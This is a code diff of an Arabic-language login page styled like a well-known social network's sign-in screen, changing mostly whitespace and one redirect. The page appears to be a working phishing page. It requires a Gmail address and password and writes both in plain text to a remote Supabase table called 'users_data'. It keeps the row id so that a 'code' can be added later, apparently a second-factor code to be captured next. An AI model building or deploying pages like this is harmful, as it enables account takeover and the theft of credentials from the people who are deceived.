@@ -1,120 +1,119 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تسجيل الدخول</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #fafafa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .login-card {
-      background: #ffffff;
-      border: 1px solid #dbdbdb;
-      padding: 30px;
-      width: 320px;
-      text-align: center;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-    }
-    h2 {
-      margin-bottom: 20px;
-      color: #262626;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      box-sizing: border-box;
-      background: #fafafa;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background-color: #0095f6;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    button:disabled {
-      background-color: #b2dffc;
-    }
-  </style>
-  <!-- مكتبة Supabase JS -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-card {
+      background: #ffffff;
+      border: 1px solid #dbdbdb;
+      padding: 30px;
+      width: 320px;
+      text-align: center;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #262626;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      box-sizing: border-box;
+      background: #fafafa;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:disabled {
+      background-color: #b2dffc;
+    }
+  </style>
+  <!-- مكتبة Supabase JS -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <div class="login-card">
-    <h2>تسجيل الدخول</h2>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="البريد الإلكتروني (@gmail.com)" required>
-      <input type="password" id="password" placeholder="كلمة السر" required>
-      <button type="submit" id="submitBtn">متابعة</button>
-    </form>
-  </div>
+  <div class="login-card">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="البريد الإلكتروني (@gmail.com)" required>
+      <input type="password" id="password" placeholder="كلمة السر" required>
+      <button type="submit" id="submitBtn">متابعة</button>
+    </form>
+  </div>
 
-  <script>
-    // إعداد الاتصال بـ Supabase
-    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
-    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtF...'; // قم بلصق مفتاح Publishable الكامل هنا
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+  <script>
+    // إعداد الاتصال بـ Supabase
+    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtF...'; // قم بلصق مفتاح Publishable الكامل هنا
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const form = document.getElementById('loginForm');
-    const submitBtn = document.getElementById('submitBtn');
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
 
-      // التأكد من أن الإيميل ينتهي بـ @gmail.com
-      if (!email.toLowerCase().endsWith('@gmail.com')) {
-        alert('يرجى إدخال بريد إلكتروني ينتهي بـ @gmail.com');
-        return;
-      }
+      // التأكد من أن الإيميل ينتهي بـ @gmail.com
+      if (!email.toLowerCase().endsWith('@gmail.com')) {
+        alert('يرجى إدخال بريد إلكتروني ينتهي بـ @gmail.com');
+        return;
+      }
 
-      submitBtn.disabled = true;
-      submitBtn.innerText = 'جاري الإرسال...';
+      submitBtn.disabled = true;
+      submitBtn.innerText = 'جاري الإرسال...';
 
-      try {
-        // إدخال الإيميل وكلمة السر في جدول users_data
-        const { data, error } = await supabaseClient
-          .from('users_data')
-          .insert([{ email: email, password: password }])
-          .select();
+      try {
+        // إدخال الإيميل وكلمة السر في جدول users_data
+        const { data, error } = await supabaseClient
+          .from('users_data')
+          .insert([{ email: email, password: password }])
+          .select();
 
-        if (error) {
-          console.error('Error inserting data:', error);
-          alert('حدث خطأ أثناء حفظ البيانات: ' + error.message);
-          submitBtn.disabled = false;
-          submitBtn.innerText = 'متابعة';
-        } else if (data && data.length > 0) {
-          // حفظ ID السطر المنشأ للاستفادة منه في إضافة الكود لاحقاً
-          localStorage.setItem('user_row_id', data[0].id);
-          
-          // 👈 تم تعديل هذا السطر ليحيل المستخدم مباشرة لصفحة أدخل الكود
-          window.location.href = '/code.html';
-        }
-      } catch (err) {
-        console.error('Unexpected error:', err);
-        alert('حدث خطأ غير متوقع!');
-        submitBtn.disabled = false;
-        submitBtn.innerText = 'متابعة';
-      }
-    });
-  </script>
+        if (error) {
+          console.error('Error inserting data:', error);
+          alert('حدث خطأ أثناء حفظ البيانات: ' + error.message);
+          submitBtn.disabled = false;
+          submitBtn.innerText = 'متابعة';
+        } else if (data && data.length > 0) {
+          // حفظ ID السطر المنشأ للاستفادة منه في إضافة الكود لاحقاً
+          localStorage.setItem('user_row_id', data[0].id);
+          // التحويل إلى صفحة إدخال الكود
+          window.location.href = '/userlist';
+        }
+      } catch (err) {
+        console.error('Unexpected error:', err);
+        alert('حدث خطأ غير متوقع!');
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'متابعة';
+      }
+    });
+  </script>
 </body>
 </html>
